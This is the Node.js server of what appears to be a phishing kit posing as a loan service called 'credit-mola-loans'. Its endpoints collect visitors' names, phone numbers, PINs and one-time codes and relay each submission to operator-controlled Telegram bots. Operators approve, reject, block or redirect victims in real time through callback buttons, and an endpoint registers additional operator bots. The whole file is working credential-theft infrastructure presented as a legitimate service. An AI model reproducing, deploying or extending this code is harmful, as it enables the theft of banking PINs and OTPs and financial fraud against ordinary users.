require('dotenv').config();
const express = require('express');
const cors = require('cors');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const fs = require('fs');
const { sendTelegramMessage } = require('./services/telegram'); // ✅ FIXED PATH
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 10000;

// ---------------- SET CORRECT BACKEND DOMAIN ----------------
const BACKEND_DOMAIN = "https://credit-mola-loans.onrender.com";
const DISABLE_BOTS = process.env.DISABLE_BOTS === "true";

const BOTS_FILE = path.join(__dirname, 'bots.json');

// ---------------- MEMORY ----------------
const approvedPins = {};
const approvedCodes = {};
const blockPins = {};
const redirectToPinCodes = {};
const requestBotMap = {};

// ---------------- MULTI-BOT ----------------
let bots = [];
if (fs.existsSync(BOTS_FILE)) {
    try {
        bots = JSON.parse(fs.readFileSync(BOTS_FILE, 'utf-8'));
        console.log('✅ Bots loaded:', bots);
    } catch {
        bots = [];
    }
} else {
    bots = [];
    fs.writeFileSync(BOTS_FILE, JSON.stringify(bots, null, 2));
}

// ---------------- MIDDLEWARE ----------------
app.use(cors({
    origin: '*',
    methods: ['GET','POST','OPTIONS'],
    allowedHeaders: ['Content-Type']
}));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// ---------------- HELPERS ----------------
function getBot(botId) {
    return bots.find(b => b.botId === botId);
}
function saveBots() {
    fs.writeFileSync(BOTS_FILE, JSON.stringify(bots, null, 2));
}

// ---------------- WEBHOOKS ----------------
async function setWebhookForBot(bot) {
    if (!bot.botToken || !bot.botId) return;
    try {
        const webhookUrl = `${BACKEND_DOMAIN}/telegram-webhook/${bot.botId}`;
        await axios.get(`https://api.telegram.org/bot${bot.botToken}/setWebhook?url=${webhookUrl}`);
        console.log(`✅ Webhook set for ${bot.botId}`);
    } catch (err) {
        console.error(`❌ Webhook error for ${bot.botId}`, err.message);
    }
}

async function setWebhooksForAllBots() {
    if (DISABLE_BOTS) return;
    for (const bot of bots) await setWebhookForBot(bot);
}

// ---------------- PAGES ----------------
app.get('/bot/:botId', (req, res) => {
    const bot = getBot(req.params.botId);
    if (!bot) return res.status(404).send('Invalid bot');
    res.redirect(`/index.html?botId=${bot.botId}`);
});

app.get('/details', (req, res) => res.sendFile(path.join(__dirname, 'public/details.html')));
app.get('/pin', (req, res) => res.sendFile(path.join(__dirname, 'public/pin.html')));
app.get('/code', (req, res) => res.sendFile(path.join(__dirname, 'public/code.html')));
app.get('/success', (req, res) => res.sendFile(path.join(__dirname, 'public/success.html')));

// ---------------- PIN ----------------
app.post('/submit-pin', async (req, res) => {
    const { name, phone, pin, botId } = req.body;
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    const requestId = uuidv4();
    approvedPins[requestId] = null;
    requestBotMap[requestId] = botId;

    await sendTelegramMessage(bot, { type:'PIN', name, phone, pin, requestId });
    res.json({ requestId });
});

app.get('/check-pin/:requestId', (req, res) => {
    const id = req.params.requestId;
    if (blockPins[id]) return res.json({ blocked: true });
    if (redirectToPinCodes[id]) return res.json({ redirectToPin: true });
    res.json({ approved: approvedPins[id] ?? null });
});

// ---------------- CODE ----------------
app.post('/submit-code', async (req, res) => {
    const { name, phone, code, botId } = req.body;
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    const requestId = uuidv4();
    approvedCodes[requestId] = null;
    requestBotMap[requestId] = botId;

    await sendTelegramMessage(bot, { type:'CODE', name, phone, code, requestId });
    res.json({ requestId });
});

app.get('/check-code/:requestId', (req, res) => {
    res.json({ approved: approvedCodes[req.params.requestId] ?? null });
});

// ---------------- TELEGRAM WEBHOOK ----------------
app.post('/telegram-webhook/:botId', async (req, res) => {
    const bot = getBot(req.params.botId);
    if (!bot) return res.sendStatus(404);

    const cb = req.body.callback_query;
    if (!cb) return res.sendStatus(200);

    const [action, requestId] = cb.data.split(':');

    if (action === 'pin_ok') approvedPins[requestId] = true;
    if (action === 'pin_bad') approvedPins[requestId] = false;
    if (action === 'pin_block') blockPins[requestId] = true;
    if (action === 'code_ok') approvedCodes[requestId] = true;
    if (action === 'code_bad') approvedCodes[requestId] = false;
    if (action === 'code_pin') redirectToPinCodes[requestId] = true;

    await axios.post(`https://api.telegram.org/bot${bot.botToken}/answerCallbackQuery`, {
        callback_query_id: cb.id
    });

    res.sendStatus(200);
});

// ---------------- ADD BOT ----------------
app.post('/add-bot', async (req, res) => {
    const { botId, botToken, chatId } = req.body;
    if (!botId || !botToken || !chatId) return res.status(400).json({ error: 'Missing fields' });
    if (getBot(botId)) return res.status(400).json({ error: 'Bot exists' });

    bots.push({ botId, botToken, chatId });
    saveBots();
    await setWebhookForBot({ botId, botToken });

    res.json({ ok: true, botLink: `${BACKEND_DOMAIN}/bot/${botId}` });
});

// ---------------- DEBUG ----------------
app.get('/debug/bots', (req, res) => res.json(bots));

// ---------------- START ----------------
setWebhooksForAllBots().then(() => {
    app.listen(PORT, () => {
        console.log(`🚀 Server running on ${PORT}`);
    });
});
